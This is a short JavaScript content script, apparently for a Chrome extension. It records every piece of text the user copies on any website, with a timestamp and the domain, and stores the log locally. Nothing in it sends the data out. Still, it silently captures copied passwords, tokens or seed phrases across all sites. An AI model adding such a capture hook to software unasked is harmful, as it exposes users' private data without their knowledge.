document.addEventListener("copy", () => {
  const selection = window.getSelection();
  const copiedText = selection.toString().trim();
  if (!copiedText) return;

  const timestamp = new Date().getTime(); // 使用时间戳更方便计算位置
  const domain = window.location.hostname; // 获取域名，例如 "github.com" 或 "twitter.com"

  chrome.storage.local.get({ clipboardLog: [] }, (data) => {
    const updated = [...data.clipboardLog, { 
        text: copiedText, 
        time: timestamp, 
        domain: domain 
    }];
    chrome.storage.local.set({ clipboardLog: updated });
    console.log(`Seed collected from ${domain}:`, copiedText.substring(0, 20) + "...");
  });
});